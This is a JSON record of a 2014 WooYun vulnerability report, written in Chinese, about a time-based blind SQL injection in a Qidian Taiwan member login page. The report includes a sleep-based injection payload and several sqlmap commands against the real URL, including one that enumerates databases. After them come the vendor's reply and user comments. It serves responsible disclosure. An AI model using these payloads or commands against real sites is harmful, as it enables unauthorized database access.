{"id": 35, "wybug_id": "wooyun-2014-077864", "wybug_title": "起点中文网某分站一处盲注", "wybug_corp": "盛大网络", "wybug_author": "大象", "wybug_date": "2014-09-29 22:44", "wybug_open_date": "2014-11-13 22:46", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-29：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-13：\t细节向公众公开  简要描述：  基于时间的盲注，利用起来比较困难，但是安全无小事~~ 详细说明：  https://members.qidian.com.tw/apps/login.php会员登录处提交的参数未过滤，post的内容 \naccount=test&pwd=test1&comefrom_id=1&owner=COC&front_events_id=&front_events_name=&client_ip=123.123.123.31&url=http%3A%2F%2Fwww.qidian.com.tw&=%E7%99%BB%E5%85%A5&remember_me=1\n响应时间0.5Sacount 处改为 \nif(now()=sysdate(),sleep(6),0)/*'XOR(if(now()=sysdate(),sleep(6),0))OR'\"XOR(if(now()=sysdate(),sleep(6),0))OR\"*/ =>\n响应时间6.5S，可见此处是可以进行时间盲注的。经测试account，client_ip，front_events_id，front_events_name，url，owner这几个参数都是可注入的.放到sqlmap里试试，竟然一个注入点都没跑出来，可能网络不太好，时间盲注对网络要求较高，又试了几次跑出acount一个点.\nsqlmap -u https://members.qidian.com.tw/apps/login.php  --data \"account=test&pwd=test1&comefrom_id=1&owner=COC&front_events_id=&front_events_name=&client_ip=123.132.225.31&url=http%3A%2F%2Fwww.qidian.com.tw&=%E7%99%BB%E5%85%A5&remember_me=1\" --technique T\n\n\n想继续深入下发现连库都跑不出来。修改了下 --time-sec参数，又跑出一个注入点。\nsqlmap -u https://members.qidian.com.tw/apps/login.php  --data \"account=test&pwd=test1&comefrom_id=1&owner=COC&front_events_id=&front_events_name=&client_ip=123.132.123.31&url=http%3A%2F%2Fwww.qidian.com.tw&=%E7%99%BB%E5%85%A5&remember_me=1\" --technique T --time-sec 20\n\n\n这次换个参数注入可以继续了\nsqlmap -u https://members.qidian.com.tw/apps/login.php  --data \"account=test&pwd=test1&comefrom_id=1&owner=COC&front_events_id=&front_events_name=&client_ip=123.132.225.31&url=http%3A%2F%2Fwww.qidian.com.tw&=%E7%99%BB%E5%85%A5&remember_me=1\" --dbs --time-sec 20\n\n\n   漏洞证明：  时间盲注费时间，整了半天，才跑把几个库跑出来。\n\n   修复方案：  此处好像完全没有过滤啊......   版权声明：转载请注明来源 大象@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-09-29 23:06 厂商回复： 谢谢报告，跑不出数据来就对了，你懂的！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-29 23:29 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  @盛大网络 这话说的相当有底气啊....看来有什么机制在里面    \n     2014-10-24 22:20 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  @子非海绵宝宝 25个漏洞197rank....我还有9个没确认呢、哼、一定超过你    \n     2014-11-14 12:00 |    \t\t带我玩 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:6        | 带我玩)\t\t \n  @老和尚 你超不过了...    \n     2015-05-13 17:29 |    \t\tTioyer \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:10        | 初来乍到，请各位大牛多多指教！)\t\t \n  您能给我个您的联系方式吗？    \n     2015-05-13 20:53 |    \t\t大象 \t\t\t( 实习白帽子  |\t\t\t        Rank:74 漏洞数:35        | ~~~^_^~~~)\t\t \n  @Tioyer 有什么事么？可以邮件联系 shisithle#gamil.com    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}